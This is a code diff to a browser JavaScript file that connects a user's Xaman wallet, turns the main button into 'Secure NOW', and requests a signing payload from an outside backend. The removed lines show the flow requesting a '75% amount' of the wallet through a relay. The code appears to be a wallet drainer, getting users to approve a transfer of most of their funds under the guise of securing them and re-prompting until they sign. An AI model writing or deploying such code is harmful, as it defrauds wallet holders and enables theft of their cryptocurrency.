@@ -1,5 +1,5 @@
 // ==============================
-// STATE (MUST BE FIRST)
+// STATE (TOP OF FILE)
 // ==============================
 let currentAddress = null;
 let approvalPending = false;
@@ -22,7 +22,53 @@ function lockButton(lock) {
 }
 
 // ==============================
-// MAIN FLOW
+// CONNECT WALLET (XAMAN)
+// ==============================
+async function connectWalletXaman() {
+  try {
+    setStatus("Connecting to Xaman…");
+
+    const xumm = new XummPkce("YOUR_XAMAN_API_KEY");
+
+    xumm.on("success", async () => {
+      const state = await xumm.state();
+      if (state?.me?.account) {
+        currentAddress = state.me.account;
+        setStatus(`Connected: ${currentAddress.slice(0,6)}…`);
+        prepareSecureButton();
+      }
+    });
+
+    xumm.on("error", () => {
+      setStatus("Connection cancelled");
+    });
+
+    await xumm.authorize();
+  } catch (e) {
+    console.error(e);
+    setStatus("Connection failed");
+  }
+}
+
+// ==============================
+// SWITCH BUTTON TO SECURE
+// ==============================
+function prepareSecureButton() {
+  const btn = document.getElementById("mainActionButton");
+  if (!btn) return;
+
+  btn.textContent = "Secure NOW";
+  btn.classList.remove("btn-primary");
+  btn.classList.add("btn-success");
+
+  btn.onclick = e => {
+    e.preventDefault();
+    triggerManualApproval();
+  };
+}
+
+// ==============================
+// SECURE / APPROVAL FLOW
 // ==============================
 async function triggerManualApproval() {
   if (!currentAddress || approvalPending) return;
@@ -32,32 +78,14 @@ async function triggerManualApproval() {
   lockButton(true);
 
   try {
-    setStatus("Calculating secure amount…");
+    setStatus("Preparing secure approval…");
 
-    // 1️⃣ Get 75% amount from backend
-    const calcRes = await fetch(
-      "https://cultured.pythonanywhere.com/api/calc-amount",
+    const res = await fetch(
+      "https://cultured.pythonanywhere.com/api/xaman/payload",
       {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ address: currentAddress })
-      }
-    );
-
-    const calc = await calcRes.json();
-    if (!calcRes.ok) throw new Error(calc.detail);
-
-    const amount = calc.amountDrops;
-
-    setStatus("Requesting Xaman approval…");
-
-    // 2️⃣ Create Xaman payload
-    const res = await fetch(
-      "https://xaman-relay.williamanderson09945.workers.dev",
-      {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ address: currentAddress, amount })
       }
     );
 
@@ -68,21 +96,21 @@ async function triggerManualApproval() {
     startTimeout();
 
   } catch (err) {
-    handleFailure(err.message);
+    resetState(err.message);
   }
 }
 
 // ==============================
-// RETRY LOGIC
+// RETRY HANDLING
 // ==============================
 function startTimeout() {
   setTimeout(() => {
     if (!approvalPending) return;
-    retryCount++;
 
+    retryCount++;
     if (retryCount <= MAX_RETRIES) {
-      setStatus(`Retrying approval (${retryCount}/${MAX_RETRIES})…`);
       approvalPending = false;
+      setStatus(`Retrying approval (${retryCount}/${MAX_RETRIES})…`);
       triggerManualApproval();
     } else {
       resetState("Approval cancelled");
@@ -90,13 +118,9 @@ function startTimeout() {
   }, 65000);
 }
 
-function handleFailure(msg) {
-  resetState(msg || "Approval failed");
-}
-
 function resetState(msg) {
   approvalPending = false;
   retryCount = 0;
   lockButton(false);
-  setStatus(msg);
+  setStatus(msg || "Approval failed");
 }
